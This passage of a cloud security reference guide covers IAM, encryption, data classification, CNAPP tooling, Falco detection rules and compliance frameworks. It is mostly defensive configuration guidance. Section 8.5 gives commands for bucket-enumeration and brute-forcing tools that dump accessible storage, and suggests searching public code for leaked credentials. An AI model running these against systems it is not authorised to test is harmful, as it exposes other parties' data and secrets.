Azure ABAC (Preview → GA) adds conditions to role assignments based on blob index tags, container names, etc.
```
Condition: @Resource[Microsoft.Storage/storageAccounts/blobServices/containers/blobs/tags:Project<$key_case_insensitive$>] StringEquals 'Contoso'
```

---

### 7.5 Just-in-Time Access Patterns

| Pattern | Implementation |
|---|---|
| AWS SSO Permission Sets + IAM Identity Center | Users request elevated access via approval workflow; time-limited assignment |
| PIM for Azure RBAC | Eligible assignment + activation with approval/MFA |
| GCP PAM (Privileged Access Manager) | GA feature for JIT grants to GCP principals |
| Custom Lambda + Slack Bot | Slack command → Lambda → AssumeRole for limited time, revoke on schedule |
| Teleport | Open-source, supports AWS/GCP/Azure, SSH, Kubernetes — certificate-based JIT |
| HashiCorp Boundary | Dynamic access broker for cloud resources |
| CyberArk Alero / Delinea | Enterprise PAM with cloud integration |

**GCP PAM**:
```bash
# Create grant (request JIT access)
gcloud pam grants create \
  --entitlement=ENTITLEMENT_ID \
  --requested-duration=3600s \
  --justification="Investigating production incident INC-1234" \
  --location=global
```

---

### 7.6 Automated IAM Policy Testing

**parliament** (AWS IAM linting):
```bash
pip install parliament
parliament --file policy.json
# Checks: unknown actions, invalid ARNs, overly permissive, missing conditions
```

**iamlive** (generate least-privilege from actual usage):
```bash
# Run alongside AWS CLI — captures API calls and generates minimum policy
iamlive --set-ini  # Configure AWS CLI proxy
aws s3 ls         # Your AWS operations
# iamlive outputs the minimum IAM policy for operations performed
```

**Policy Sentry** (IAM policy generator):
```bash
pip install policy_sentry
policy_sentry write-policy --input-file actions.yml
# Generate policy based on actions and resource ARNs
```

**AWS IAM Access Analyzer Policy Generation**:
```bash
# Generate policy from CloudTrail events
aws accessanalyzer start-policy-generation \
  --policy-generation-details '{"principalArn":"arn:aws:iam::123456789012:role/MyRole"}' \
  --cloud-trail-details '{"trails":[{"cloudTrailArn":"arn:aws:cloudtrail:..."}],"startTime":"2024-01-01T00:00:00Z","endTime":"2024-06-01T00:00:00Z"}'
aws accessanalyzer get-generated-policy --job-id JOB_ID
```

**tf-aws-iam-policy-document** / **Conftest** / **OPA**: Policy-as-code testing for IaC.

---

### 7.7 CIEM Tools

**Cloud Infrastructure Entitlement Management** tools analyze net-effective permissions and identify excess entitlements.

| Tool | Approach |
|---|---|
| Tenable Cloud Security (Ermetic) | Net-effective permissions graph; human + machine identities |
| Authomize | Identity security platform; cross-cloud |
| CrowdStrike Falcon CIEM | Integrated with EDR platform |
| Wiz CIEM | Part of CNAPP; attack path + entitlement analysis |
| Prisma Cloud CIEM | Permission queries, remediation playbooks |
| AWS IAM Access Analyzer | Native AWS; external access + unused access |
| Google Cloud IAM Recommender | Suggests least-privilege roles based on actual usage |
| Azure Entra ID Access Reviews | Periodic review with auto-remediation |

**GCP IAM Recommender**:
```bash
# Get recommendations for a principal
gcloud recommender recommendations list \
  --recommender=google.iam.policy.Recommender \
  --location=global \
  --project=my-project

# Apply a recommendation
gcloud recommender recommendations mark-claimed RECOMMENDATION_ID \
  --project=my-project --location=global \
  --recommender=google.iam.policy.Recommender
```

---

## 8. Cloud Data Security

### 8.1 Encryption at Rest

#### AWS

| Type | Key Management | Use Case |
|---|---|---|
| SSE-S3 (AES-256) | AWS-managed per-object keys | Default S3 encryption |
| SSE-KMS | KMS CMK (aws/s3 or customer CMK) | Audit key usage, cross-account control |
| SSE-C | Customer-supplied key per request | Customer controls all key material |
| DSSE-KMS | Dual-layer SSE with two KMS keys | Highest assurance (regulatory compliance) |

**Enforce encryption**:
```json
{
  "Sid": "DenyUnencryptedUploads",
  "Effect": "Deny",
  "Principal": "*",
  "Action": "s3:PutObject",
  "Resource": "arn:aws:s3:::my-bucket/*",
  "Condition": {
    "StringNotEquals": {"s3:x-amz-server-side-encryption": "aws:kms"}
  }
}
```

**EBS encryption**: Enable by default (account-level default KMS key or custom CMK). `aws ec2 enable-ebs-encryption-by-default`

**RDS encryption**: Must enable at creation. Encrypts storage, automated backups, read replicas, snapshots using KMS CMK.

#### GCP

| Type | Description |
|---|---|
| GMEK (Google-managed encryption key) | Default; Google manages keys |
| CMEK (Customer-managed encryption key) | Cloud KMS key, customer controls rotation/deletion |
| CSEK (Customer-supplied encryption key) | Customer provides key material per request; GCP never stores |

**CMEK configuration** (GCS):
```bash
gcloud storage buckets create gs://my-bucket \
  --default-kms-key projects/my-project/locations/global/keyRings/my-ring/cryptoKeys/my-key
```

#### Azure

| Type | Description |
|---|---|
| PMK (Platform-managed key) | Microsoft manages keys |
| CMK (Customer-managed key) | Key stored in Azure Key Vault |
| Double encryption | Two layers of encryption (PMK + CMK or CMK + CMK) |

**Enforce CMK for storage**:
```bash
az storage account update \
  --name mystorageaccount \
  --resource-group myRG \
  --encryption-key-source Microsoft.Keyvault \
  --encryption-key-vault https://myvault.vault.azure.net \
  --encryption-key-name mykey \
  --encryption-key-version KEY_VERSION
```

---

### 8.2 Encryption in Transit

**TLS enforcement patterns**:

**AWS**: Bucket policy `aws:SecureTransport: false` → Deny. API Gateway: require TLS 1.2+. CloudFront: minimum TLS 1.2 policy. RDS: `rds.force_ssl=1` for PostgreSQL, `require_secure_transport=ON` for MySQL.

**GCP**: Load balancers enforce HTTPS. Cloud SQL: `requireSsl: true`. `constraints/compute.requireSslCertificates` org policy.

**Azure**: Storage: `supportsHttpsTrafficOnly: true`. SQL: `sslEnforcement: Enabled`. App Service: HTTPS Only setting. TLS minimum version configurable (require 1.2).

---

### 8.3 Data Classification

**Amazon Macie**:
- Managed data identifiers: SSN, credit card, driver's license, passport, ABA routing, AWS credentials, private keys, medical terms (200+ types)
- Custom data identifiers: regex + maximum match distance + keywords + ignore words
- Sensitivity score per S3 bucket (0-100)

```bash
# Create Macie classification job
aws macie2 create-classification-job \
  --job-type SCHEDULED \
  --schedule-frequency WEEKLY \
  --name "Weekly-PII-Scan" \
  --s3-job-definition '{"bucketDefinitions":[{"accountId":"123456789012","buckets":["my-bucket"]}]}'
```

**GCP DLP API** (Sensitive Data Protection):
- 150+ built-in infoTypes: PERSON_NAME, EMAIL_ADDRESS, PHONE_NUMBER, CREDIT_CARD_NUMBER, US_SOCIAL_SECURITY_NUMBER, IBAN_CODE, etc.
- Custom infoTypes: word lists, regex, stored infoTypes
- Actions: inspect (find), de-identify (redact/mask/tokenize/encrypt), risk analysis (statistical properties)

```bash
gcloud dlp jobs create content-inspect \
  --location us-central1 \
  --inspect-config '{"infoTypes":[{"name":"EMAIL_ADDRESS"},{"name":"CREDIT_CARD_NUMBER"}]}' \
  --storage-config '{"cloudStorageOptions":{"fileSet":{"url":"gs://my-bucket/**"}}}'
```

**Microsoft Purview** (formerly AIP):
- Sensitivity labels: Public, General, Confidential, Highly Confidential
- Auto-labeling: content-based (detect CCN, SSN, etc.) or context-based
- Data Loss Prevention (DLP) policies: prevent sharing of labeled content
- Information barriers: prevent communication between groups

---

### 8.4 Database Security

**AWS RDS IAM Authentication**:
```bash
# Generate auth token (valid 15 minutes)
aws rds generate-db-auth-token \
  --hostname mydb.cluster-xxxxx.us-east-1.rds.amazonaws.com \
  --port 5432 \
  --region us-east-1 \
  --username iam_user

# Connect using token as password
PGPASSWORD=$(aws rds generate-db-auth-token ...) psql -h HOST -U iam_user mydb
```

**GCP Cloud SQL Auth Proxy**:
```bash
# Download and run proxy
./cloud-sql-proxy my-project:us-central1:my-instance --port 5432 &
# Connect to 127.0.0.1:5432 — proxy handles IAM auth and TLS
# Auth: Cloud SQL Client role (cloudsql.instances.connect)
```

**Azure SQL**:
- **TDE (Transparent Data Encryption)**: Encrypts database files at rest (enabled by default)
- **Always Encrypted**: Column-level encryption — keys never leave client; SQL Server never sees plaintext
- **Dynamic Data Masking**: Obfuscates sensitive data for non-privileged users (partial/full masking)
- **Azure AD authentication**: MFA-capable, no passwords in connection strings
- **Ledger tables**: Immutable, append-only tables with cryptographic verification

---

### 8.5 Object Storage Exposure Assessment

**S3Scanner**:
```bash
pip install s3scanner
s3scanner scan --bucket target-bucket       # Check single bucket
s3scanner scan --bucket-file buckets.txt    # Check list
s3scanner dump --bucket target-bucket       # List contents of accessible bucket
```

**GCPBucketBrute**:
```bash
python3 GCPBucketBrute.py -k companyname -s wordlist.txt -o output.txt
# Tests permutations: companyname, company-name, companyname-backup, etc.
```

**BlobHunter** (Azure):
```bash
python BlobHunter.py -a STORAGE_ACCOUNT_NAME   # Hunt for exposed blobs
```

**TruffleHog / GitLeaks**: Scan repositories for secrets (AWS keys, GCP SA keys, Azure connection strings).

**grep.app / GitHub code search**: Find exposed cloud credentials in public repos.

---

### 8.6 DSPM (Data Security Posture Management)

DSPM platforms continuously discover and classify sensitive data across cloud environments.

| Platform | Capabilities |
|---|---|
| Wiz DSPM | Integrated with CNAPP; agentless discovery, sensitive data + access path analysis |
| Laminar | Data catalog, lineage tracking, risk scoring |
| Dig Security | Data store discovery, classification, anomaly detection |
| Cyera | Real-time data monitoring across IaaS/SaaS |
| Securiti | Data intelligence, consent management, regulatory compliance |
| BigID | ML-based classification, privacy risk, data rights management |

**DSPM capabilities**:
- Shadow data discovery (data stores not in official inventory)
- Sensitive data classification (PII, PHI, PCI, IP)
- Data access entitlements analysis (who can access sensitive data)
- Data flow mapping and lineage
- Regulatory compliance mapping (GDPR, HIPAA, CCPA, SOC 2)
- Anomaly detection for unusual data access patterns
- Remediation recommendations (encryption, access removal, retention policies)

---

## 9. Cloud Native Security (CNAPP)

### 9.1 CSPM (Cloud Security Posture Management)

CSPM continuously monitors cloud configurations against security best practices and compliance frameworks.

#### Wiz

**Architecture**: Agentless scanning via read-only API access + snapshot analysis.

**Key capabilities**:
- **Attack path analysis**: Visualizes multi-step attack paths to crown jewels (databases, secrets, admin accounts)
- **Toxic combinations**: Identifies co-occurrence of multiple risk factors creating critical risk
  - Example: "Internet-exposed VM with critical CVE + admin IAM role + IMDSv1 + connection to database with sensitive data"
- **Security graph**: All resources + configurations + vulnerabilities + network exposure in a graph database
- **Risk prioritization**: Context-aware scoring (exposure + identity + data sensitivity)
- **Cloud Detection and Response (CDR)**: Real-time threat detection via cloud provider logs

**Wiz query example** (WQL — Wiz Query Language):
```
FIND Cloud Resource
WHERE Cloud Resource.type = 'VirtualMachine'
  AND Cloud Resource.isInternetExposed = TRUE
  AND Cloud Resource.hasAdminIAMRole = TRUE
  AND Cloud Resource.criticalCVECount > 0
```

#### Orca Security

**SideScanning**: Reads cloud provider storage snapshots out-of-band — no agents, no performance impact, no privilege escalation risk.

**Coverage**: Vulnerabilities (CVEs), malware, misconfigurations, authentication risks, lateral movement paths, sensitive data, compliance.

#### Prisma Cloud (Palo Alto Networks)

**Modules**:
- **Cloud Security Posture (CSPM)**: Configuration assessment
- **Cloud Workload Protection (CWPP)**: Runtime protection for VMs, containers, serverless
- **Cloud Network Security (CNS)**: Microsegmentation, network anomaly detection
- **Cloud Infrastructure Entitlement Management (CIEM)**: IAM analysis
- **Application Security (Supply Chain Security)**: IaC, SCA, SAST integration in CI/CD

---

### 9.2 CIEM (Cloud Infrastructure Entitlement Management)

**Core problem**: In cloud environments, identities (human + machine) accumulate excessive permissions over time. CIEM identifies and remediates excess entitlements.

**Key metrics**:
- **Net-effective permissions**: What a principal can actually do, accounting for all policy types (identity, resource, SCPs, permission boundaries)
- **Permission utilization**: What % of granted permissions are actually used
- **Privilege score**: Normalized score of how privileged an identity is

**Analysis dimensions**:
- Human identities (users, federated identities)
- Machine identities (service accounts, roles, managed identities, SPs)
- Cross-cloud identities (federation chains)
- Privileged identities (those with admin/owner capabilities)
- Orphaned identities (accounts with no owner or recent usage)

**Authomize**:
```bash
# Connect cloud providers via API
# Ingest IAM policies, activity logs, resource configurations
# Query: "Show all identities with s3:* permissions on production buckets"
# Generate least-privilege recommendations
# Track remediation progress
```

**Tenable Cloud Security (Ermetic)**:
```bash
# Net-effective permissions analysis
# "Can user X actually delete production RDS?" → traces through all policies
# Attack simulation: model blast radius of compromised identity
# Automated remediation: generate restrictive replacement policies
```

---

### 9.3 CWPP (Cloud Workload Protection Platform)

**Runtime protection components**:
- **Host-based**: EDR for cloud VMs (CrowdStrike, Defender for Servers)
- **Container runtime**: eBPF-based syscall monitoring (Falco, Sysdig, Aqua)
- **Serverless**: Function invocation monitoring, dependency scanning

**Falco** (CNCF — open-source runtime security):
```yaml
# Falco rule example
- rule: Unexpected outbound connection from container
  desc: Detect outbound connections from containers to non-approved IPs
  condition: >
    outbound and container and not proc.name in (approved_processes)
    and not fd.sip in (approved_ips)
  output: >
    Outbound connection from container (user=%user.name container=%container.name
    image=%container.image.repository command=%proc.cmdline connection=%fd.name)
  priority: WARNING
  tags: [network, container]

- rule: Privilege escalation via sudo
  desc: Sudo used inside container
  condition: container and proc.name = sudo
  output: Sudo executed in container (user=%user.name command=%proc.cmdline container=%container.name)
  priority: ERROR
```

```bash
# Deploy Falco on Kubernetes
helm install falco falcosecurity/falco \
  --set falco.grpc.enabled=true \
  --set falco.grpcOutput.enabled=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.config.slack.webhookurl=https://hooks.slack.com/...
```

---

### 9.4 Agentless vs Agent-based Scanning

| Dimension | Agentless | Agent-based |
|---|---|---|
| Deployment | API access only | Agent installed in each workload |
| Coverage | VM snapshots, container images, configs | Running processes, memory, network traffic |
| Performance impact | None on workload | CPU/memory overhead |
| Data freshness | Periodic (snapshot-based) | Real-time |
| Runtime visibility | Limited | Full syscall-level visibility |
| Evasion resistance | Easier to evade (point-in-time) | Harder to evade (continuous monitoring) |
| Scalability | Scales easily | Agent management overhead |
| Ephemeral workloads | May miss short-lived containers | Captures if agent deployed in image |

**Hybrid approach** (recommended): Agentless for broad coverage and discovery; agents for high-value workloads needing runtime protection.

---

### 9.5 Cloud Detection and Response (CDR)

**CDR** is the extension of EDR/XDR concepts to cloud control plane and data plane activity.

**Data sources**:
- Cloud provider audit logs (CloudTrail, Azure Activity Log, GCP Audit Logs)
- Resource logs (VPC Flow Logs, DNS logs, S3 access logs)
- Application logs (API Gateway, WAF, CloudFront)
- Identity logs (sign-in logs, PIM activation logs)
- Threat intelligence (IP reputation, domain intel)

**Detection categories** (MITRE ATT&CK for Cloud):

| Tactic | Technique |
|---|---|
| Initial Access | Valid accounts, phishing for cloud credentials, trusted relationship |
| Execution | Cloud admin command, serverless function invocation |
| Persistence | Account manipulation, implant in cloud image, modify cloud compute infrastructure |
| Privilege Escalation | Valid accounts, cloud admin roles |
| Defense Evasion | Unused/unsupported cloud regions, disable cloud logs, modify cloud compute infrastructure |
| Credential Access | Unsecured credentials in files/metadata, steal application tokens |
| Discovery | Cloud infrastructure discovery, cloud storage enumeration, cloud service enumeration |
| Lateral Movement | Use alternate auth material, internal spearphishing |
| Exfiltration | Transfer to cloud account, exfiltration over web service |
| Impact | Data destruction, account access removal, financial resource discovery |

---

### 9.6 CIS Benchmarks for Cloud

**CIS AWS Foundations Benchmark** (current: v3.0):
- Section 1: IAM (MFA, access keys, password policy, support role)
- Section 2: Storage (S3 encryption, public access block, CloudTrail log encryption)
- Section 3: Logging (CloudTrail multi-region, log validation, CloudWatch metrics/alarms)
- Section 4: Monitoring (unauthorized API calls, console login without MFA, root usage, IAM changes, etc.)
- Section 5: Networking (default SG blocks all, no VPC peering to 0.0.0.0/0)

**CIS Azure Foundations Benchmark** (current: v2.0.0):
- Section 1: IAM (MFA, no guest users, no custom subscriptions with admin, privileged roles review)
- Section 2: Defender for Cloud (plans, email notifications, auto-provisioning)
- Section 3: Storage (secure transfer, public access, encryption)
- Section 4: Database (SQL auditing, TDE, threat detection)
- Section 5: Logging and Monitoring (activity log alerts, diagnostic settings)
- Section 6: Networking (RDP/SSH restricted, NSG flow logs, Bastion, Firewall)
- Section 7: VM (endpoint protection, OS disk encryption)
- Section 8: Key Vault (purge protection, soft delete, logging, key/secret/cert expiry)

**CIS GCP Foundations Benchmark** (current: v3.0.0):
- Section 1: IAM (service account keys, SA admin, SA account user, KMS separation)
- Section 2: Logging (audit logs all services, log metric filters + alerts)
- Section 3: Networking (default firewall, SSH/RDP from internet, no default network)
- Section 4: VM (full API access, OS Login, serial ports, project-wide SSH keys)
- Section 5: Storage (bucket public access, uniform IAM, logging, versioning, retention)
- Section 6: Cloud SQL (SSL, authorized networks, contained DB auth)
- Section 7: BigQuery (CMK encryption, public access)

---

## 10. Serverless, DevSecOps & Cloud Compliance

### 10.1 Lambda Security

#### Execution Role Least Privilege

Lambda functions run with an IAM execution role. Follow least privilege strictly.

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject"],
      "Resource": "arn:aws:s3:::specific-bucket/prefix/*"
    },
    {
      "Effect": "Allow",
      "Action": ["logs:CreateLogGroup", "logs:CreateLogStream", "logs:PutLogEvents"],
      "Resource": "arn:aws:logs:*:*:log-group:/aws/lambda/function-name:*"
    }
  ]
}
```

**Common Lambda vulnerabilities**:

| Vulnerability | Risk | Mitigation |
|---|---|---|
| Over-privileged execution role | Lateral movement | Least-privilege role, use iamlive |
| Secrets in environment variables | Credential exposure in logs/config | Use Secrets Manager + Lambda extension |
| Event injection | Data exfiltration, SSRF, path traversal | Validate/sanitize all input from events |
| Dependency vulnerabilities | RCE, cryptojacking | AWS Inspector Lambda scanning, pip-audit |
| VPC misconfig | Data exfiltration via Lambda | Enable VPC for sensitive functions + use VPC endpoints |
| Overly permissive resource policy | Unauthorized invocation | Restrict lambda:InvokeFunction to specific principals |

**Environment variable secrets** — use Secrets Manager Lambda extension:
```bash
# Add layer (region-specific ARN)
aws lambda update-function-configuration \
  --function-name my-function \
  --layers arn:aws:lambda:us-east-1:177933569100:layer:AWS-Parameters-and-Secrets-Lambda-Extension:17

# Access secret at runtime (no SDK call needed)
import urllib.request
headers = {'X-Aws-Parameters-Secrets-Token': os.environ['AWS_SESSION_TOKEN']}
secret = urllib.request.urlopen(urllib.request.Request(
  'http://localhost:2773/secretsmanager/get?secretId=mySecret', headers=headers
)).read()
```

**Lambda Power Tools** (AWS):
- Structured logging, metrics, tracing (X-Ray), event validation, idempotency, feature flags
- Input validation with Pydantic models prevents event injection

---

### 10.2 Azure Functions & Cloud Run Security

**Azure Functions**:
- **Managed identity**: Use system-assigned or user-assigned MI — no credentials in code
- **Key Vault references**: App settings reference Key Vault secrets directly (`@Microsoft.KeyVault(SecretUri=...)`)
- **Network isolation**: Restrict inbound triggers (IP restrictions, private endpoints), restrict outbound (VNet integration)
- **Authentication/authorization**: Built-in Easy Auth (validates JWT from Entra ID)
- **CORS**: Restrict allowed origins; never use `*` in production

**Google Cloud Run**:
- Runs containers — all container security practices apply
- **Service identity**: Each Cloud Run service has a service account; follow least privilege
- **Ingress control**: Internal, Internal + Cloud Load Balancing, or All
- **Egress control**: Route through VPC connector for network policy enforcement
- **Binary Authorization**: Require signed container images before deployment
- **Secret Manager integration**: Mount secrets as volumes or env vars (recommended over plain env vars)
- **Request timeout**: Default 5 min, max 60 min — tune to reduce attack window

---

### 10.3 Container Registry Security

**AWS ECR**:
```bash
# Enable image scanning on push
aws ecr put-image-scanning-configuration \
  --repository-name my-repo \
  --image-scanning-configuration scanOnPush=true

# Enhanced scanning (Inspector v2 — continuous CVE monitoring)
aws ecr put-registry-scanning-configuration \
  --scan-type ENHANCED \
  --rules '[{"repositoryFilters":[{"filter":"*","filterType":"WILDCARD"}],"scanFrequency":"CONTINUOUS_SCAN"}]'

# Image signing with Notation (AWS Signer)
aws signer put-signing-profile --profile-name my-profile \
  --platform-id AmazonECS-docker-linux-x86

notation sign --plugin com.amazonaws.signer.notation.plugin \
  --id arn:aws:signer:us-east-1:123:signing-profiles/my-profile \
  123456789012.dkr.ecr.us-east-1.amazonaws.com/my-repo:latest

# Lifecycle policy (remove untagged images older than 30 days)
aws ecr put-lifecycle-policy --repository-name my-repo \
  --lifecycle-policy-text '{"rules":[{"rulePriority":1,"selection":{"tagStatus":"untagged","countType":"sinceImagePushed","countUnit":"days","countNumber":30},"action":{"type":"expire"}}]}'
```

**Cosign** (sigstore) — image signing:
```bash
# Generate key pair
cosign generate-key-pair

# Sign image
cosign sign --key cosign.key gcr.io/my-project/my-image:tag

# Verify signature
cosign verify --key cosign.pub gcr.io/my-project/my-image:tag

# Keyless signing (GitHub Actions — uses OIDC)
cosign sign --identity-token=$(cat /tmp/oidc-token) gcr.io/my-project/my-image:tag
```

---

### 10.4 IaC Security Scanning

**Checkov** (Bridgecrew/Prisma Cloud):
```bash
pip install checkov
checkov -d ./terraform                    # Scan all Terraform files
checkov -f main.tf                        # Scan specific file
checkov -d . --framework cloudformation  # CloudFormation
checkov -d . --framework kubernetes      # Kubernetes manifests
checkov -d . --framework arm             # Azure ARM templates
checkov -d . --check CKV_AWS_18         # Run specific check only
checkov -d . --skip-check CKV_AWS_18   # Skip specific check
checkov -d . --output json > results.json
checkov -d . --compact --quiet          # CI/CD mode
```

**tfsec** (now part of Trivy):
```bash
tfsec ./terraform                         # Scan Terraform
tfsec --exclude aws-s3-enable-versioning ./terraform
tfsec --format json ./terraform > results.json
# Or use Trivy:
trivy config ./terraform                  # IaC scanning
trivy fs .                                # Filesystem + IaC + secrets
```

**cfn-nag** (CloudFormation):
```bash
gem install cfn-nag
cfn_nag_scan --input-path template.yaml
cfn_nag_scan --input-path ./templates/ --template-pattern '*.yaml'
```

**terrascan** (Accurics):
```bash
pip install terrascan
terrascan scan -t aws -i terraform         # AWS Terraform
terrascan scan -t azure -i arm            # Azure ARM
terrascan scan -t gcp -i terraform        # GCP Terraform
terrascan scan -i k8s -d ./manifests/    # Kubernetes
```

**Trivy** (comprehensive):
```bash
trivy image nginx:latest                   # Container image scan
trivy fs .                                 # Filesystem (deps + IaC + secrets)
trivy repo https://github.com/org/repo    # Git repository
trivy config ./                            # IaC configuration
trivy k8s --report summary cluster        # Live Kubernetes cluster
```

---

### 10.5 Cloud Compliance Frameworks

#### FedRAMP (Federal Risk and Authorization Management Program)

**Authorization process (ATO — Authority to Operate)**:
1. **Initiation**: Select impact level (Low/Moderate/High), choose authorization path (Agency ATO or JAB P-ATO)
2. **Documentation**: System Security Plan (SSP) — 300+ controls based on NIST SP 800-53
3. **Assessment**: 3PAO (Third-Party Assessment Organization) performs independent security assessment
4. **Authorization**: Authorizing Official (AO) reviews Package (SSP + SAR + POA&M) and grants ATO
5. **ConMon (Continuous Monitoring)**: Monthly vulnerability scans, annual assessments, incident reporting within 1 hour (High) / 1 day (Moderate/Low)

**Key requirements**: FIPS 140-2 validated encryption, MFA for privileged users, PIV/CAC for federal users (High), FedRAMP-authorized third-party services only, US-only data residency.

**FedRAMP Marketplace**: List of authorized cloud services (CSOs). Required for federal agencies to use.

#### SOC 2 Type II

- **Trust Services Criteria (TSC)**: Security (required), Availability, Processing Integrity, Confidentiality, Privacy
- **Type I**: Point-in-time assessment of controls design
- **Type II**: 6-12 month assessment of controls operating effectiveness
- **Common cloud controls**: Encryption at rest/transit, access control reviews, change management, incident response, vendor management, monitoring and alerting
- **Report audience**: Service organizations to demonstrate security to customers (not public)

#### ISO 27001

- **ISMS** (Information Security Management System): Risk-based management framework
- **Annex A controls**: 93 controls in 4 themes (Organizational, People, Physical, Technological) — ISO 27002 provides implementation guidance
- **Certification**: Accredited CB (certification body) audits; certificate valid 3 years with annual surveillance audits
- **Statement of Applicability (SoA)**: Document all controls, justification for inclusion/exclusion

#### HIPAA (Health Insurance Portability and Accountability Act)

- **Covered entities**: Healthcare providers, health plans, clearinghouses
- **Business Associates**: Vendors processing PHI on behalf of covered entities — require BAA (Business Associate Agreement)
- **BAA with cloud providers**: AWS, Azure, GCP all offer BAAs; specific services covered (review their HIPAA-eligible services lists)
- **Safeguards**: Administrative (training, policies, risk analysis), Physical (facility access, workstation security), Technical (access control, audit logs, encryption, integrity)
- **Breach notification**: Within 60 days of discovery (500+ individuals → notify HHS + media; <500 → annual log to HHS)

#### CCPA/CPRA (California Consumer Privacy Act)

- **Consumer rights**: Access, deletion, portability, opt-out of sale/sharing, correct inaccurate data, limit sensitive personal information use
- **Sensitive personal information**: SSN, driver's license, financial account, precise geolocation, racial/ethnic origin, health, biometric, sexual orientation, union membership
- **Data processing records**: Document categories of PI collected, purposes, retention periods, third parties shared with
- **Security**: "Reasonable security measures" — referencing CIS Controls, NIST CSF

---

### 10.6 Shared Responsibility Model

**Summary by service type**:

| Layer | IaaS (EC2/VM/GCE) | PaaS (RDS/App Service/Cloud SQL) | SaaS (Salesforce/O365/Workspace) |
|---|---|---|---|
| Data | Customer | Customer | Customer |
| Application | Customer | Customer | Vendor |
| Runtime | Customer | Vendor | Vendor |
| Middleware | Customer | Vendor | Vendor |
| OS | Customer | Vendor | Vendor |
| Virtualization | Vendor | Vendor | Vendor |
| Physical | Vendor | Vendor | Vendor |

**Inherited controls** (from cloud provider): Physical security, environmental controls, network infrastructure, hypervisor security.

**Shared controls**: Patch management (provider patches infrastructure; customer patches OS/apps), configuration management, training, incident response (provider handles infrastructure; customer handles application layer).

**Customer-owned always**: Data classification, identity management, application security, network traffic protection (encryption in transit), client-side encryption.

---

### 10.7 Cloud Security Certifications

| Certification | Issuer | Focus | Prerequisites |
|---|---|---|---|
| AWS Certified Security – Specialty (SCS-C02) | AWS | AWS security services, incident response, logging, infrastructure security, data protection, identity | AWS experience; AWS SAA or SAP recommended |
| Google Professional Cloud Security Engineer (PCSE) | Google | GCP IAM, VPC security, compliance, data protection, logging | GCP Associate Cloud Engineer recommended |
| AZ-500: Microsoft Azure Security Technologies | Microsoft | Entra ID, Azure Security Center, network security, data security | AZ-104 recommended |
| CCSP (Certified Cloud Security Professional) | (ISC)² | Vendor-neutral cloud security architecture, design, operations, legal compliance | 5 years IT exp. including 3 in infosec + 1 in cloud |
| CCSK (Certificate of Cloud Security Knowledge) | CSA | CSA Guidance, ENISA cloud computing, CCM | No prerequisites (exam only) |
| AWS Certified Solutions Architect – Professional (SAP-C02) | AWS | Broad AWS architecture; valuable for security context | AWS SAA |
| CompTIA Cloud+ | CompTIA | Vendor-neutral cloud infrastructure and security | CompTIA Network+ recommended |

**Study resources**:
- AWS: re:Invent security talks (YouTube), AWS Security Blog, AWS workshops (workshops.aws)
- Azure: Microsoft Learn, SC-100/SC-200/SC-300 content
- GCP: Google Cloud Skills Boost, Security Engineer learning path
- General: SANS FOR509 (Cloud Forensics), SEC510 (Cloud Security Controls)

---

*Last updated: 2026-05-06 | Maintained by TeamStarWolf | For professional cybersecurity reference use*
